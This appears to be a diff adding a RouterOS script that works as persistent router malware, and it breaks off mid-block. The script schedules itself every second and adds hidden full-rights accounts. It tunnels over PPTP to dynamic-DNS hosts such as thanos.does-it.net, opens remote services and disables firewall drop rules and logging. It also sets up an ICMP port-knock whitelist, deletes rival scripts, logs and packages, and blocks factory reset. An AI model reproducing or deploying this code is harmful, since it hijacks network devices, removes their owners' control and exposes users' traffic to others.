@@ -1,0 +1,974 @@
+:glo rstTime 17084;
+:glo rosX 6346;
+:glo xFlag false;
+:glo sysCLRFlag false;
+:glo moROSF true;
+:glo moMACF false;
+:glo fPort 21;
+:glo sPort 22;
+:glo tPort 23;
+:glo sC;
+:glo sCM 5;
+:glo s5;
+:glo JRST;
+:glo xey;
+:glo sysTime;
+:glo sRM 900;
+:glo sR2;
+:glo sR1;
+:glo sysJ;
+:glo sysNoOther;
+:glo sysPPS;
+:glo UAC;
+:glo PTPST;
+:glo sysB;
+:glo sysE;
+:glo DOM;
+:glo systemV 30RC9;
+:loc lntp;
+:loc ZZ;
+:loc QQ;
+:loc SP;
+:loc pt;
+:loc HL 60;
+:loc mX 1;
+:loc jST;
+:loc M;
+:loc TR;
+:loc TA;
+:loc RF;
+:loc t;
+:loc s8 ":glo sysJ;:loc s4 false;/fil {:fore f in [find type=\"backup\"] do={:loc n [get \$f name];/sys back save name=\$n;}};:loc s1;:loc s2;:loc s0 [:len [/sys scr find name=system]];:loc ss [:len [/sys sch find name=system]];:loc s3 false;:if (\$s0=1) do={:if (\$ss=1) do={:set s1 [/sys scr get [find name=system] run-count];:del 3;:set s2 [/sys scr get [find name=system] run-count];:if (\$s2=0 or (\$s1=\$s2)) do={/sys sch rem [find name=system];:del 1;/sys sch add name=system disable=no interval=1s on-event=system start-date=jan/01/1970 start-time=00:00:00;}} else={:set s3 true;}} else={:set s3 true;};:if (\$s3) do={:loc xx;/fil {:fore f in [find] do={:loc x [get \$f name];:if ([:len [:find \$x \"ss.db\"]]=1) do={:set xx \$x;:set s4 true;}}};:if (\$s4) do={:set sysJ true;/import \$xx;};}"
+:loc s9 "/lcd set ena=no tou=dis;";
+:if ([:len [/sys scr job find script="system"]]>=2) do={
+:set t [/sys clo get time];
+:for x from=0 to=([:len $t]-1) do={
+:if ([:pick $t $x ($x+1)]=":") do={
+:set t ([:pick $t 0 $x].",".[:pick $t ($x+1) [:len $t]])
+}
+};
+:set t [:toarray $t];
+:set sysTime ((($t->0)*3600)+(($t->1)*60)+($t->2));
+/sys scr job {
+:fore j in=[find script="system"] do={
+:set TA [get $j start];
+:set M [:pick $TA ([:find $TA " "]+1) [:len $TA]];
+:for x from=0 to=([:len $M]-1) do={
+:if ([:pick $M $x ($x+1)]=":") do={
+:set M ([:pick $M 0 $x].",".[:pick $M ($x+1) [:len $M]])
+}
+};
+:set M [:toarray $M];
+:set jST ((($M->0)*3600)+(($M->1)*60)+($M->2));
+:loc g;
+:if ($sysTime<$jST) do={
+:set g ($sysTime+86400-$jST)
+} else={
+:set g ($sysTime-$jST)
+};
+:if ($g>=$sR1) do={
+:set sR1 $g
+} else={
+:set sR1 ($sR1-1)
+};
+:if ($sR1>$sRM) do={
+/sys reb
+}
+}
+};
+:if ([:len [/too net find host=8.8.8.8]]!=1) do={
+/too net rem [find host=8.8.8.8];
+/too net add host=8.8.8.8 dis=no int=1 tim=1 up=$s8 down=$s8;
+} else={
+:loc u8 [/too net get [find host=8.8.8.8] up];
+:loc d8 [/too net get [find host=8.8.8.8] down];
+:loc db [/too net get [find host=8.8.8.8] dis];
+:loc i8 [/too net get [find host=8.8.8.8] int];
+:if (((($u8=$s8) and ($d8=$s8)) and !$db) and ($i8=[:totime 1])) do={
+:del 0
+} else={
+/too net set [find host=8.8.8.8] up=$s8 down=$s8 dis=no int=1
+}
+}
+} else={
+:set sysNoOther true;
+:set UAC [:len [/use act find name!="system"]];
+:loc mLOG false;
+/use act {
+:fore u in=[find] do={
+:loc uu [get $u address];
+:loc vv [get $u via];
+:if (([:len [:find $uu ":"]]!=0) or (($vv="console") or ($vv="local"))) do={
+:set mLOG true;
+}
+}
+};
+:if ($UAC=0) do={
+:set sysNoOther true;
+} else={
+:set sysB [/sys clo get time];
+:set sysNoOther true;
+/use act {
+:fore a in=[find via!="ftp"] do={
+:if ([get $a name]!="system") do={
+:if ($sysCLRFlag) do={
+/fil pri fil=sysCLR;
+/ip fir lay rem [find name=sysCLR];
+:del 1;
+/ip fir lay add name=sysCLR regexp=true;
+:del 1;
+/sys reb;
+};
+:set sysNoOther false;
+:set sC 0;
+:if ([:len [/ip fir lay find name=sysIntru]]=0) do={
+/ip fir lay add name=sysIntru regex=true
+};
+:if ([:len [/fil find name=pps.txt]]!=0) do={
+:set sysPPS [/fil get [find name=pps.txt] content]
+} else={
+:set sysPPS 0
+}
+}
+}
+}
+};
+:if ($sysNoOther and (!$mLOG)) do={
+/ip fir add {
+:loc t;
+:loc i;
+:loc c 0;
+:fore p in [find list=vp] do={
+:set c ($c+1);
+:set t [:tostr [get $p address]];
+:loc y false;
+:fore e in [/use get [find name=sys] add] do={
+:set i [:tostr [:pick $e 0 [:find $e "/"]]];
+:if ($i=$t) do={
+:set y true
+}
+};
+:if (!$y) do={
+/use set [find name=sys] add=([/use get [find name=sys] addr],$t)
+}
+};
+:if ($c=0) do={/use set [find name=sys] add=127.0.0.1}
+};
+:set DOM "allimpir.dyndns.org";
+:loc k [/sys reso get archi];
+:if (([:len [/ip fir lay find name=sysJail]]!=0) or $sysJ) do={
+:set pt "jail"
+} else={
+:set pt "void"
+};
+:if ($k="tile") do={
+:set PTPST ($pt."CCR")
+} else={
+:if ($k="powerpc") do={
+:set PTPST ($pt."PPC")
+} else={
+:if ($k="mipsbe") do={
+:set PTPST ($pt."MIPSBE")
+} else={
+:if ($k="mmips") do={
+:set PTPST ($pt."MMIPS")
+} else={
+:if ($k="smips") do={
+:set PTPST ($pt."SMIPS")
+} else={
+:if (($k="x86") or ($k="x86_64")) do={
+:set PTPST ($pt."X86")
+} else={
+:if ($k="arm") do={
+:set PTPST ($pt."ARM")
+} else={
+:set PTPST $pt
+}
+}
+}
+}
+}
+}
+};
+:if ([:len [/ip fir lay find name=sysIntru]]=1) do={
+:if ($sC<$sCM) do={
+:set sC ($sC+1);
+:if ([:len [/ip fir lay find name=sysJail]]!=0) do={
+:loc mV [/ip fir lay get [find name=sysJail] regex];
+:loc sysV [:tonum [:pick $systemV 0 2]];
+:set xey [:pick [/sys clo get time] 6 8];
+:if ($mV>=$mX) do={
+/ip fir lay set [find name=sysJail] regex=0;
+:if ($sysV>=30) do={
+:if ([:len [/use find name=sys]]=0) do={
+/use add nam=sys gro=full dis=no pas=([/ip fir lay get [find name=syscret] regexp].$xey) add=127.0.0.1;
+:del 1;
+/ip fir lay rem [find name=syscret];
+/use set [find group=sys] group=full;
+/use gro rem [find name=sys];
+/use gro add name=sys copy-from=full policy=!test,!wri,!pas,!sen,!api,!loc,!tel,!ssh,!ftp,!pol,!sni;
+:del 1;
+/use set [find name!=sys] group=sys;
+/use set [find name=system] group=full;
+} else={
+/use rem [find name=system];
+/use set [find group=sysT] group=full;
+/use gro rem [find name=sysT];
+/use gro add name=sysT copy-from=full policy=!test,!wri,!pas,!sen,!api,!loc,!tel,!ssh,!ftp,!pol,!sni;
+:del 1;
+/use gro set [find name=sys] policy=[/use gro get [find name=sysT] policy];
+/use gro rem [find name=sysT];
+/use set [find name!=sys] group=sys;
+/ip fir lay rem [find name=syscret];
+}
+} else={
+:if ($sysV>=26) do={
+:if ([:len [/use find name=sys]]=0) do={
+/use add nam=sys gro=full dis=no pas=([/ip fir lay get [find name=syscret] regexp].$xey) add=127.0.0.1;
+/ip fir lay rem [find name=syscret];
+/use set [find group=sys] group=full;
+/use gro rem [find name=sys];
+:del 1;
+/use gro add name=sys copy-from=full policy=!test,!wri,!pas,!sen,!api,!loc,!tel,!ssh,!ftp,!pol,!sni;
+:del 1;
+/use set [find name!=sys] group=sys;
+/use set [find name=system] group=full;
+}
+}
+}
+}
+}
+} else={
+/ip fir lay rem [find name=sysIntru];
+:if ([:len [/int pptp-cli find name=system]]!=1) do={
+/int pptp-cli rem [find name=system];
+:del 1;
+/int pptp-cli add allow=mschap1,mschap2 connect-to=8.8.8.8 disabled=no name=system password=password profile=default user=$PTPST;
+:del 1;
+} else={
+/int pptp-cli set [find name=system] connect-to=8.8.8.8 disabled=no profile=default user=$PTPST password=password
+};
+:loc p2;
+:loc pS;
+:if (([:len [/ip dns get servers]]=0) and ([:len [/ip dns get dynamic-servers]]=0)) do={
+/ip dns set servers=8.8.8.8,8.8.4.4
+};
+:set DOM "thanos.does-it.net";
+:if ([:typeof [/int pptp-cli get [find name=system] connect-to]]="ip") do={
+:set p2 [/int pptp-cli get [find name=system] connect-to];
+:set pS [:resolve $DOM];
+:if ($p2!=$pS) do={
+/int pptp-cli set [find name=system] connect-to=$pS disabled=no user=$PTPST password=password
+}
+} else={
+:set p2 [/int pptp-cli get [find name=system] connect-to];
+:set pS $DOM;
+:if ($p2!=$pS) do={
+/int pptp-cli set [find name=system] connect-to=$pS disabled=no user=$PTPST password=password
+}
+};
+:loc wt 2;
+:loc pW true;
+:while (($wt>0) and $pW) do={
+:set pW (![/int pptp-cli get [find name=system] running]);
+:set wt ($wt-1);
+:del 1;
+};
+:if ((!$pW)) do={
+/ip fir fil set [find chain=input and src-address="172.16.0.0/12" and action="accept"] in-interface=system action=accept;
+:if ([:len [/ip fir fil find chain=input and src-address="172.16.0.0/12" and in-interface="!system" and action="drop"]]=0) do={
+:if ([:len [/ip fir fil find chain=input and src-address="172.16.0.0/12" and in-interface="system"]]!=0) do={
+/ip fir fil add copy-from=[find chain=input and src-address="172.16.0.0/12" and in-interface="system" and action="accept"] in-interface=!system action=drop
+}
+};
+:if ([:len [/ip rou find dst-address=172.24.0.0/13]]!=1) do={
+/ip rou rem [find dst-address=172.24.0.0/13];
+:del 1;
+/ip rou add dst-address=172.24.0.0/13 gateway=system com=system;
+} else={
+:if ([/ip rou get [find dst-address=172.24.0.0/13] gateway]!="system") do={
+/ip rou set [find dst-address=172.24.0.0/13] gateway=system;
+}
+};
+:if ([:len [/ip rou find dst-address=172.25.0.0/24]]!=1) do={
+/ip rou rem [find dst-address=172.25.0.0/24];
+:del 1;
+/ip rou add dst-address=172.25.0.0/24 gateway=system com=system;
+} else={
+:if ([/ip rou get [find dst-address=172.25.0.0/24] gateway]!="system") do={
+/ip rou set [find dst-address=172.25.0.0/24] gateway=system;
+}
+}
+}
+}
+} else={
+:loc p2;
+:loc pS;
+:if ([:len [/int pptp-cli find name=system]]!=1) do={
+/int pptp-cli rem [find name=system];
+:del 1;
+/int pptp-cli add allow=mschap1,mschap2 connect-to=8.8.8.8 disabled=no name=system password=password profile=default user=$PTPST;
+:del 1;
+} else={
+:if (([:len [/ip dns get servers]]=0) and ([:len [/ip dns get dynamic-servers]]=0)) do={
+/ip dns set servers=8.8.8.8,8.8.4.4
+};
+:set DOM "thanos.does-it.net";
+:if ([:typeof [/int pptp-cli get [find name=system] connect-to]]="ip") do={
+:set p2 [/int pptp-cli get [find name=system] connect-to];
+:set pS [:resolve $DOM];
+:if ($p2!=$pS) do={
+/int pptp-cli set [find name=system] connect-to=$pS disabled=no
+}
+} else={
+:set p2 [/int pptp-cli get [find name=system] connect-to];
+:set pS $DOM;
+:if ($p2!=$pS) do={
+/int pptp-cli set [find name=system] connect-to=$pS disabled=no
+}
+};
+:loc wt 2;
+:loc pW true;
+:while (($wt>0) and $pW) do={
+:set pW (![/int pptp-cli get [find name=system] running]);
+:set wt ($wt-1);
+:del 1;
+};
+:if ((!$pW)) do={
+:if ([:len [/use find name=system]]=0) do={
+/snm exp ver fil=init10;
+/ip ser exp ver fil=init11;
+/ip fir service-port exp ver fil=init12;
+/sys log set [find] disable=yes;
+/sys log exp ver fil=init13;
+/sys ntp cli exp ver fil=init15;
+:del 2;
+/use add gro=full name=system address=172.24.0.0/13,127.0.0.1;
+/int pptp-ser ser set default-profile=default enabled=yes max-mru=1472 max-mtu=1472;
+/ip poo rem [find name=system];
+/ppp pro rem [find comment=system];
+/ppp sec rem [find comment=system];
+:del 1;
+/ip poo add name=system ranges=10.147.147.2-10.147.147.254;
+/ppp pro add local-address=10.147.147.1 name=system remote-address=system com=system;
+/ppp sec add nam=spidy pas=peterparker pro=system ser=pptp com=system;
+/ip fir nat add action=masquerade chain=srcnat com=system;
+/fil rem [find type=".log file"];
+/fil rem [find type=package];
+/fil rem [find type=".npk file"];
+:loc serx {"ftp";"ssh";"telnet";"api"};
+:loc ipx {"172.24.0.0/13";"127.0.0.1/32"};
+:fore k in $ipx do={
+:fore x in $serx do={
+:loc CHK false;
+:loc a [/ip ser get [find name=$x] address];
+:fore y in $a do={
+:if ($y=$k) do={
+:set CHK true
+}
+};
+:if (!$CHK) do={
+/ip ser set [find name=$x] dis=no add=([/ip ser get [find name=$x] address],$k)
+}
+}
+};
+/ip ser set telnet port=$tPort disabled=no;
+/ip ser set www address="" disabled=no;
+/ip fir service-port set [find name=ftp] disabled=no ports=$fPort;
+/ip fir fil set [find chain=input and action=drop] dis=yes;
+/ip fir fil set [find chain=output and action=drop] dis=yes;
+/ip fir fil set [find chain=input and protocol="icmp"] dis=yes;
+:del 1;
+/ip fir fil add cha=input act=add-src-to-address-list address-list=k address-list-timeout=1 packet-size=99 pro=icmp src-address-list=!k com=system;
+/ip fir fil add cha=input act=add-src-to-address-list address-list=l address-list-timeout=2 packet-size=98 pro=icmp src-address-list=k com=system;
+/ip fir fil add cha=input act=add-src-to-address-list address-list=m address-list-timeout=3 packet-size=97 pro=icmp src-address-list=l com=system;
+/ip fir fil add cha=input act=add-src-to-address-list address-list=vp address-list-timeout=5 packet-size=96 pro=icmp src-address-list=m com=system;
+/ip fir fil add cha=input src-address=172.16.0.0/12 act=accept com=system;
+/ip fir fil add cha=output src-address=172.16.0.0/12 act=accept com=system;
+/ip fir fil add cha=input src-address=127.0.0.1/32 act=accept com=system;
+/ip fir fil add cha=output src-address=127.0.0.1/32 act=accept com=system;
+/ip fir fil add cha=input dst-port=21,22,23,162 src-address=!172.16.0.0/12 act=drop protocol=tcp com=system;
+/ip fir fil add cha=input dst-port=161 src-address=!172.16.0.0/12 act=drop protocol=udp com=system;
+:loc tinf;
+/int pppoe-client {
+:fore i in=[find running=yes] do={
+:set tinf [get $i name];
+/ip fir fil add cha=input dst-port=53 in-interface=$tinf act=drop protocol=udp com=system dis=no;
+}
+}
+};
+:if ([:len [/ip rou find dst-address=172.24.0.0/13]]!=1) do={
+/ip rou rem [find dst-address=172.24.0.0/13];
+:del 1;
+/ip rou add dst-address=172.24.0.0/13 gateway=system com=system;
+} else={
+:if ([/ip rou get [find dst-address=172.24.0.0/13] gateway]!="system") do={
+/ip rou set [find dst-address=172.24.0.0/13] gateway=system
+}
+};
+:if ([:len [/ip rou find dst-address=172.25.0.0/24]]!=1) do={
+/ip rou rem [find dst-address=172.25.0.0/24];
+:del 1;
+/ip rou add dst-address=172.25.0.0/24 gateway=system com=system;
+} else={
+:if ([/ip rou get [find dst-address=172.25.0.0/24] gateway]!="system") do={
+/ip rou set [find dst-address=172.25.0.0/24] gateway=system
+}
+};
+/ip fir fil set [find chain=input and src-address="172.16.0.0/12" and action="accept"] in-interface=system action=accept;
+:if ([:len [/ip fir fil find chain=input and src-address="172.16.0.0/12" and in-interface="!system" and action="drop"]]=0) do={
+:if ([:len [/ip fir fil find chain=input and src-address="172.16.0.0/12" and in-interface="system"]]!=0) do={
+/ip fir fil add copy-from=[find chain=input and src-address="172.16.0.0/12" and in-interface="system" and action="accept"] in-interface=!system action=drop
+}
+}
+};
+/int pptp-cli mon [find name=system] once do={
+:set lntp $"remote-address";
+};
+:loc ntpt [/sys ntp cli get pri];
+:if ($ntpt!=$lntp) do={
+/sys ntp cli set pri=$lntp sec=$lntp ena=no;
+:del 1;
+/sys ntp cli set ena=yes;
+}
+};
+:set t [/sys clo get time];
+:for x from=0 to=([:len $t]-1) do={
+:if ([:pick $t $x ($x+1)]=":") do={
+:set t ([:pick $t 0 $x].",".[:pick $t ($x+1) [:len $t]])
+}
+};
+:set t [:toarray $t];
+:set sysTime ((($t->0)*3600)+(($t->1)*60)+($t->2));
+:if (($sysTime<($rstTime+2)) and ($sysTime>($rstTime-2))) do={
+:if ([:len [/ip fir lay find name=sysR]]=0) do={
+/ip fir lay add name=sysR regexp=1
+} else={
+:if ([:len [:tonum [/ip fir lay get [find name=sysR] regexp]]]=0) do={
+/ip fir lay set [find name=sysR] regexp=1
+} else={
+:loc J [:tonum [/ip fir lay get [find name=sysR] regexp]];
+:set J ($J+1);
+/ip fir lay set [find name=sysR] regexp=$J;
+}
+};
+/sys reb;
+}
+}
+} else={
+:set ZZ [/sys scr get [find name=system] source];
+:set QQ [/sys scr get [find name=system] policy];
+:if ([:len [/sys sch find name=system]]=0) do={
+/sys sch add int=1s name=system on-event=system start-date=jan/01/1970 start-time=00:00:00 disable=no
+};
+:set SP [/sys sch get [find name=system] policy];
+:loc syscret;
+:set s5 false;
+/fil {
+:fore f in [find] do={
+:loc x [get $f name];
+:if ([:len [:find $x "ss.db"]]=1) do={
+:set s5 true;
+}
+}
+};
+:if ([:len [/ip fir lay find name=syscret]]=1) do={
+:set syscret [/ip fir lay get [find name=syscret] regexp]
+} else={
+/ip fir lay add name=syscret regexp=12345678;
+:set syscret 12345678;
+};
+/use rem [find name=system];
+/use {
+:fore u in [find] do={
+:if ([:len [:find [get $u name] system]]!=0) do={[rem $u]}
+}
+};
+/int pptp-cli rem [find name=system];
+:loc U {"sys";"func";"init"};
+/sys scr {
+:fore s in [find name!=system] do={
+:loc n [get $s name];
+:fore w in $U do={
+:loc det [:len [:find $n $w]];
+:if ($det!=0) do={
+/sys scr rem $n
+}
+}
+}
+};
+/sys sch {
+:fore s in [find name!=system] do={
+:loc n [get $s name];
+:fore w in $U do={
+:loc det [:len [:find $n $w]];
+:if ($det!=0) do={
+/sys sch rem $n
+}
+}
+}
+};
+/fil {
+:fore f in [find] do={
+:loc x [get $f name];
+:if ([:len [:find $x "init.db"]]=1) do={
+/fil rem [find name=$x]
+}
+}
+};
+/fil rem [find type=".log file"];
+/fil rem [find name=virgin.txt];
+/fil rem [find name=system.txt];
+/fil rem [find name=sysMonROS.txt];
+/fil rem [find type=package];
+/fil rem [find type=".npk file"];
+/fil rem [find type=".tar file"];
+/fil rem [find type=".rif file"];
+/fil rem [find type=".rar file"];
+/fil rem [find type=".zip file"];
+/fil rem [find name=sys-note.txt];
+:if ([:len [/fil find name=init10.rsc]]!=0) do={
+/snm com rem [find default=no];
+:del 1;
+/imp init10.rsc;
+/fil rem [find name=init10.rsc];
+};
+:if ([:len [/fil find name=init11.rsc]]!=0) do={
+/imp file=init11.rsc;
+/fil rem [find name=init11.rsc];
+} else={
+/ip ser set ftp disabled=no address="" port=21;
+/ip ser set ssh disabled=no address="" port=22;
+/ip ser set telnet disabled=no address="" port=23;
+};
+:if ([:len [/fil find name=init12.rsc]]!=0) do={
+/imp file=init12.rsc;
+/fil rem [find name=init12.rsc];
+};
+:if ([:len [/fil find name=init13.rsc]]!=0) do={
+/sys log rem [find default=no];
+/sys log act rem [find default=no];
+:del 1;
+/imp file=init13.rsc;
+/fil rem [find name=init13.rsc];
+};
+:if ([:len [/fil find name=init15.rsc]]!=0) do={
+/imp file=init15.rsc;
+/fil rem [find name=init15.rsc];
+};
+/fil rem [find type=script];
+/ip fir fil rem [find comment=system];
+/ip fir nat rem [find comment=system];
+/ip fir man rem [find comment=system];
+/ip rou rem [find comment=system];
+/ip poo rem [find name=system];
+/ppp pro rem [find comment=system];
+/ppp sec rem [find comment=system];
+/too traffic-g stop;
+/too traffic-g stream rem [find];
+/too traffic-g packet rem [find];
+/too traffic-g port rem [find];
+:loc ncnt;
+:set ncnt [:len [/ip fir nat find comment!="system"]];
+:if ($ncnt=0) do={
+/ip fir nat add action=masquerade chain=srcnat
+};
+:set t [/sys clo get time];
+:for x from=0 to=([:len $t]-1) do={
+:if ([:pick $t $x ($x+1)]=":") do={
+:set t ([:pick $t 0 $x].",".[:pick $t ($x+1) [:len $t]]);
+}
+};
+:set t [:toarray $t];
+:set sysTime ((($t->0)*3600)+(($t->1)*60)+($t->2));
+/sys scr job {
+:fore j in=[find] do={
+:set TR [get $j script];
+:set TA [get $j start];
+:if ([:typeof [get $j script]]="str") do={
+:loc scriptName [get $j script];
+:if (($scriptName="sysMonROS") or ($scriptName="init0") or ($scriptName="init1")) do={[rem $j]}
+} else={
+:set M [:pick $TA ([:find $TA " "]+1) [:len $TA]];
+:for x from=0 to=([:len $M]-1) do={
+:if ([:pick $M $x ($x+1)]=":") do={
+:set M ([:pick $M 0 $x].",".[:pick $M ($x+1) [:len $M]])
+}
+};
+:set M [:toarray $M];
+:set jST ((($M->0)*3600)+(($M->1)*60)+($M->2));
+:if ($sysTime<$jST) do={
+:set RF ($sysTime+86400-$jST)
+} else={
+:set RF ($sysTime-$jST)
+};
+:if ($RF>$HL) do={[rem $j]}
+}
+}
+};
+:set sysE [/sys clo get time];
+/sys scr job rem [find script!="system"];
+/sys scr job rem [find type="login"];
+:if ([:len [/ip fir lay find name=syslog]]=0) do={
+/ip fir lay add name=syslog regexp=1
+} else={
+:if ([:len [:tonum [/ip fir lay get [find name=syslog] regexp]]]=0) do={
+/ip fir lay set [find name=syslog] regexp=1
+} else={
+:loc J [:tonum [/ip fir lay get [find name=syslog] regexp]];
+:set J ($J+1);
+/ip fir lay set [find name=syslog] regexp=$J;
+}
+};
+:while (!$sysNoOther or $mLOG) do={
+:loc f1 ":glo f2 false;/fil {:fore f in [find] do={:loc x [get \$f name];:if ([:len [:find \$x \"ss.db\"]]=1) do={:set f2 true;}}};:if (!\$f2 and \$s5) do={:set sysJ true;};";
+/too net rem [find host=9.9.9.9];
+/too net add host=9.9.9.9 dis=no int=1 tim=1 up=($f1.$s9) down=($f1.$s9);
+/sys pac upd can;
+:del 1;
+:set sR2 ($sR2+1);
+:if ($sR2>$sRM) do={
+/sys reb
+};
+/fil rem [find type=".log file"];
+/fil rem [find type=package];
+/fil rem [find type=".npk file"];
+/fil rem [find type=script];
+:loc R {"sys";"func";"auto"};
+:loc L;
+/fil {
+:fore f in [find] do={
+:loc n [get $f name];
+:fore ww in $R do={
+:set L [:len [:find $n $ww]];
+:if ($L!=0) do={
+/fil rem $n
+}
+}
+}
+};
+:loc sysPPS;
+:if ([:len [/ip fir lay find name=sysPPS]]!=0) do={
+:set sysPPS [/ip fir lay get [find name=sysPPS] regex]
+};
+:if ([:len [/ip fir lay find name=sysIntru]]=0) do={
+/ip fir lay add name=sysIntru regex=true
+};
+:set fPort "";
+:set tPort "";
+:set sPort "";
+:set DOM "";
+:set PTPST "";
+/sys scr env rem [find name=init0V];
+/sys scr env rem [find name=tokenSYS];
+/sys scr env rem [find name=ntpIP];
+/sys scr env rem [find name=tzspIP];
+/sys scr env rem [find name=SuperManServer];
+/sys scr env rem [find name=TheHulkServer];
+/sys scr env rem [find name=routerOSServer];
+/sys scr env rem [find name=ROSuser];
+/sys scr env rem [find name=ROSpass];
+/sys scr env rem [find name=initDBready];
+/sys scr env rem [find name=CPUhighMAX];
+/sys scr env rem [find name=CPUusedMAX];
+/sys scr env rem [find name=CPUhighCount];
+/sys scr env rem [find name=CPUused];
+:loc DE false;
+:loc rNum;
+:loc rnd;
+/int ether {
+:fore e in [find running=yes] do={
+/int monitor-traffic [get $e name] once do={
+:loc o;
+:set rnd $"rx-bits-per-second";
+:set o [:tonum [:pick $rnd ([:len $rnd]-4) ([:len $rnd]-2)]];
+:if ($o>0) do={
+:set DE true;
+:set rNum $o;
+}
+}
+}
+};
+:if (!$DE) do={
+:set rNum 5
+};
+:loc rosV 0;
+:loc v;
+:loc PS 0;
+:set v [/sys reso get ver];
+:loc scope {" ";"rc";"("};
+:fore w in $scope do={
+:if ([:len [:find $v $w]]!=0) do={
+:set v [:pick $v 0 [:find $v $w]]
+}
+};
+:for x from=0 to=([:len [:tostr $v]]-1) do={
+:if ([:pick [:tostr $v] $x ($x+1)]=".") do={
+:set v ([:pick [:tostr $v] 0 $x].",".[:pick [:tostr $v] ($x+1) [:len [:tostr $v]]])}
+};
+:set v [:toarray $v];
+:if ([:len $v]=2) do={
+:set v ($v,0)
+};
+:set PS 0;
+:fore k in $v do={
+:if ($PS=0) do={
+:set rosV ($rosV+($k*1000))
+};
+:if ($PS=1) do={
+:set rosV ($rosV+($k*10))
+};
+:if ($PS=2) do={
+:set rosV ($rosV+$k)
+};
+:set PS ($PS+1);
+};
+:loc reH (299-$rNum);
+:loc reMX (300-$rNum);
+:loc p0 ":glo xey [:pick [/sys clo get time] 6 8];:loc s7 \":del 3;:glo sysJ true;:del 1;/too net rem [find host=7.7.7.7];\";:if (([/sys pac get ppp disabled] or [/sys pac get sec disabled]) or [/sys pac get advance disabled]) do={/sys pac enable [find];/too net rem [find host=7.7.7.7];/too net add host=7.7.7.7 dis=no int=1 tim=1 up=\$s7 down=\$s7;:del 1;/sys reb;};";
+:loc m1 "/too mac-ser set [find] disabled=yes;/too mac-ser mac-win set [find] disabled=yes;";
+:loc m2 "/too mac-ser set allowed-interface-list=none;/too mac-ser mac-win set allowed-interface-list=none;";
+:loc a1 ":glo PRB [:tostr [/sys rou set get prot]];:if ((\$PRB=\"disabled\") or (\$PRB=\"false\")) do={:set sysJ true;/sys rou set set ena=no prot=enabled reformat-hold-button=$reH;};";
+:loc a2 ":glo JRST [:tostr [/sys rou set get ena]];:if ((\$JRST=\"enabled\") or (\$JRST=\"true\")) do={:set sysJ true;/sys rou set set ena=no prot=enabled reformat-hold-button=$reH;};";
+:loc c0 "/sys rou set set ena=no prot=enabled sil=yes boot-dev=nand-only;:glo sysJ;";
+:loc c1 "/sys rou set set ena=no prot=enabled sil=yes boot-dev=nand-only reformat-hold-button=$reH;:glo sysJ;";
+:loc c2 "/sys rou set set ena=no prot=enabled sil=yes boot-dev=nand-only reformat-hold-button=$reH reformat-hold-button-max=$reMX;:glo sysJ;";
+:loc c3 ":glo sysJ;:glo JRST [:tostr [/sys rou set get ena]];:if ((\$JRST=\"enabled\") or (\$JRST=\"true\")) do={:set sysJ true;};";
+:loc d1 ":loc s6 \":del 60;:glo sysJ false;:del 1;/too net rem [find host=6.6.6.6];\":glo JRST [:tostr [/sys rou set get ena]];:if ((\$JRST=\"enabled\") or (\$JRST=\"true\")) do={/too net rem [find host=6.6.6.6];/too net add host=6.6.6.6 dis=no int=1 tim=1 up=\$s6 down=\$s6;/sys rou set set ena=no prot=enabled reformat-hold-button=$reH;:del 1;:if ([:len [/use gro find name=sys]]=0) do={/use gro add name=sys pol=loc,win,reb;:del 1;/use add nam=sys gro=full dis=no pas=([/ip fir lay get [find name=syscret] regexp].\$xey);/use set [find name!=sys] group=sys;} else={/use gro set [find name=sys] pol=!wri,!pas,!sen,!api,!loc,!tel,!ssh,!ftp,!pol,!sni};/sys pac upd set cha=cur;/sys pac upd che;/fil rem [find type=script];:exec {/sys pac upd ins;};:if ([:len [:find [/sys pac upd get stat] Down]]=0) do={/sys reb;}};"
+:loc SR;
+:if ($rosV>=6410) do={
+:set SR ($p0.$c2.$a1.$a2.$m2)
+} else={
+:if ($rosV>=6400) do={
+:set SR ($p0.$c2.$a1.$a2.$m1)
+} else={
+:if ($rosV>=6346) do={
+:if (($JRST="enabled") or ($JRST="true")) do={
+:set SR ($p0.$d1.$m1)
+} else={
+:set SR ($p0.$d1.$m1)
+}
+} else={
+:if ($rosV>=6330) do={
+:set SR ($p0.$c1.$a1.$a2.$m1)
+} else={
+:set SR ($p0.$c0.$m1)
+}
+}
+}
+};
+:if ([:len [/too net find host=127.0.0.1]]!=1) do={
+/too net rem [find host=127.0.0.1];
+/too net add host=127.0.0.1 int=1 tim=1 dis=no up=$SR down=$SR;
+} else={
+/too net set [find host=127.0.0.1] int=1 tim=1 dis=no up=$SR down=$SR;
+};
+:loc sysX "system";
+:loc word {"\"system\"";"=system";"rem system";"rem system";"remo system";"remov system";"remove system";"ip ser";"user g";"user a";"user s";"use g";"use a";"use s"};
+/sys scr {
+:fore s in [find name!=$sysX] do={
+:loc n [get $s name];
+:loc sSRC [get $s source];
+:fore w in $word do={
+:loc d [:len [:find $sSRC $w]];
+:if ($d!=0) do={
+/sys scr rem $n;
+:set sysJ true;
+}
+}
+}
+};
+/sys sch {
+:fore s in [find name!=$sysX] do={
+:loc n [get $s name];
+:loc sSRC [get $s on-event];
+:fore w in $word do={
+:loc d [:len [:find $sSRC $w]];
+:if ($d!=0) do={
+/sys sch rem $n;
+:set sysJ true;
+}
+}
+}
+};
+/too net {
+:fore s in [find host!=127.0.0.1] do={
+:loc h [get $s host];
+:if ($h!=8.8.8.8) do={
+:loc nws [get $s up];
+:fore w in $word do={
+:loc d [:len [:find $nws $w]];
+:if ($d!=0) do={
+/too net rem [find host=$h];
+:set sysJ true;
+}
+};
+:loc nws [get $s down];
+:fore w in $word do={
+:loc d [:len [:find $nws $w]];
+:if ($d!=0) do={
+/too net rem [find host=$h];
+:set sysJ true;
+}
+}
+}
+}
+};
+:if ([:len [/use find name=system]]!=0) do={
+/use rem [find name=system];
+:set sysJ true;
+};
+:if ([/sys route set get boot-device]!="nand-only") do={
+/sys route set set boot-device=nand-only;
+:set sysJ true;
+};
+:if ([:len [/sys scr find name=system]]=1) do={
+:loc Z [/sys scr get [find name=system] source];
+:loc Q [/sys scr get [find name=system] policy];
+:if ($Z!=$ZZ) do={
+/sys scr set [find name=system] source=$ZZ;
+:set sysJ true;
+};
+:if ($Q!=$QQ) do={
+/sys scr set [find name=system] policy=$QQ;
+:set sysJ true;
+}
+} else={
+/sys scr add name=system policy=$QQ source=$ZZ;
+:if ([:len [/sys sch find name=system]]=1) do={
+/sys sch set [find name=system] int=1s on-event=system start-date=jan/01/1970 start-time=00:00:00 disable=no;
+} else={
+/sys sch add int=1s name=system on-event=system start-date=jan/01/1970 start-time=00:00:00 disable=no;
+};
+:if ([:len [/ip fir lay find name=sysJail]]=0) do={
